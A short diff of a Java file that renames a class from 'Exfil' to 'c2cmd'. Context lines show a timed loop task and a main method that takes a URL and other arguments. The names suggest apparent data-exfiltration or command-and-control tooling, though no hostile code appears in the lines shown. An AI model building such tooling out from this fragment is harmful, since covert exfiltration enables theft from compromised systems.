@@ -5,7 +5,7 @@ import java.io.*;
 import java.net.*;
 import java.util.*;
 	
-public class Exfil{
+public class c2cmd{
 	public long delay = 10 * 1000; // delay in milliseconds
 	LoopTask task = new LoopTask();
 	Timer timer = new Timer("TaskName");
@@ -74,7 +74,7 @@ public class Exfil{
 	}
 	
 	public static void main(String[] args){    
-			Exfil xf = new Exfil();
+			c2cmd xf = new c2cmd();
 			if (args.length==4){				 
 				xf.url = args[0];
 				xf.clearcheck = args[1];
